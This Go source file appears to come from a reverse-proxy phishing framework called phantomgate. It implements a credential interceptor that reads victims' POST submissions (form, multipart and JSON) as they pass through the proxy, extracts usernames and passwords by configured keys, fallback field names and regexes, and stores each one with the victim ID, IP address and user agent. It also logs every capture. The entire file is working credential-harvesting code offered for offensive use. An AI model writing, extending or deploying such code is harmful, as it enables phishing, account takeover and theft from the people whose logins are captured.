package capture

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/phantomgate/phantomgate/internal/phishlet"
	"github.com/phantomgate/phantomgate/internal/store"
)

// CredentialInterceptor inspects HTTP requests for credential submissions
type CredentialInterceptor struct {
	store    *store.Store
	phishlet *phishlet.Phishlet
}

// NewCredentialInterceptor creates a new interceptor for the given phishlet
func NewCredentialInterceptor(s *store.Store, p *phishlet.Phishlet) *CredentialInterceptor {
	return &CredentialInterceptor{
		store:    s,
		phishlet: p,
	}
}

// InspectRequest analyzes an HTTP request body for credential fields
func (ci *CredentialInterceptor) InspectRequest(req *http.Request, body []byte, victimID string) {
	if req.Method != "POST" {
		return
	}

	contentType := req.Header.Get("Content-Type")
	username := ""
	password := ""

	switch {
	case strings.Contains(contentType, "application/x-www-form-urlencoded"):
		username, password = ci.extractFromForm(string(body))
	case strings.Contains(contentType, "application/json"):
		username, password = ci.extractFromJSON(string(body))
	case strings.Contains(contentType, "multipart/form-data"):
		username, password = ci.extractFromForm(string(body))
	}

	if username != "" || password != "" {
		cred := store.CapturedCredential{
			ID:        generateID(),
			VictimID:  victimID,
			Username:  username,
			Password:  password,
			SourceIP:  req.RemoteAddr,
			UserAgent: req.UserAgent(),
			Phishlet:  ci.phishlet.Name,
			Timestamp: time.Now(),
		}

		ci.store.AddCredential(cred)

		log.Printf("[🔑 CREDENTIAL CAPTURED] Victim=%s | User=%s | Pass=%s | IP=%s",
			victimID, username, maskPassword(password), req.RemoteAddr)
	}
}

// extractFromForm extracts credentials from URL-encoded form data
func (ci *CredentialInterceptor) extractFromForm(body string) (string, string) {
	values, err := url.ParseQuery(body)
	if err != nil {
		return "", ""
	}

	username := ""
	password := ""

	// Try the configured field names first
	if ci.phishlet.Credentials.Username.Key != "" {
		username = values.Get(ci.phishlet.Credentials.Username.Key)
	}
	if ci.phishlet.Credentials.Password.Key != "" {
		password = values.Get(ci.phishlet.Credentials.Password.Key)
	}

	// Fallback: try common field names
	if username == "" {
		for _, key := range []string{"username", "user", "email", "login", "loginfmt", "user_email", "userid"} {
			if v := values.Get(key); v != "" {
				username = v
				break
			}
		}
	}
	if password == "" {
		for _, key := range []string{"password", "pass", "passwd", "pwd", "user_password", "login_password"} {
			if v := values.Get(key); v != "" {
				password = v
				break
			}
		}
	}

	return username, password
}

// extractFromJSON extracts credentials from JSON request bodies
func (ci *CredentialInterceptor) extractFromJSON(body string) (string, string) {
	username := ""
	password := ""

	// Use regex patterns from the phishlet config
	if ci.phishlet.Credentials.Username.Search != "" {
		re, err := regexp.Compile(ci.phishlet.Credentials.Username.Search)
		if err == nil {
			matches := re.FindStringSubmatch(body)
			if len(matches) > 1 {
				username = matches[1]
			}
		}
	}
	if ci.phishlet.Credentials.Password.Search != "" {
		re, err := regexp.Compile(ci.phishlet.Credentials.Password.Search)
		if err == nil {
			matches := re.FindStringSubmatch(body)
			if len(matches) > 1 {
				password = matches[1]
			}
		}
	}

	// Fallback: generic JSON key matching
	if username == "" {
		for _, key := range []string{`"login"`, `"username"`, `"email"`, `"user"`} {
			pattern := fmt.Sprintf(`%s\s*:\s*"([^"]*)"`, key)
			re, err := regexp.Compile(pattern)
			if err == nil {
				if matches := re.FindStringSubmatch(body); len(matches) > 1 {
					username = matches[1]
					break
				}
			}
		}
	}
	if password == "" {
		for _, key := range []string{`"passwd"`, `"password"`, `"pass"`, `"pwd"`} {
			pattern := fmt.Sprintf(`%s\s*:\s*"([^"]*)"`, key)
			re, err := regexp.Compile(pattern)
			if err == nil {
				if matches := re.FindStringSubmatch(body); len(matches) > 1 {
					password = matches[1]
					break
				}
			}
		}
	}

	return username, password
}

// ReadBody reads the request body and returns it as bytes, while also
// resetting the body so it can be read again by the proxy
func ReadBody(req *http.Request) ([]byte, error) {
	if req.Body == nil {
		return nil, nil
	}
	body, err := io.ReadAll(req.Body)
	if err != nil {
		return nil, err
	}
	// Reset the body so the proxy can forward it
	req.Body = io.NopCloser(strings.NewReader(string(body)))
	return body, nil
}

func maskPassword(pass string) string {
	if len(pass) <= 2 {
		return "***"
	}
	return string(pass[0]) + strings.Repeat("*", len(pass)-2) + string(pass[len(pass)-1])
}

func generateID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}
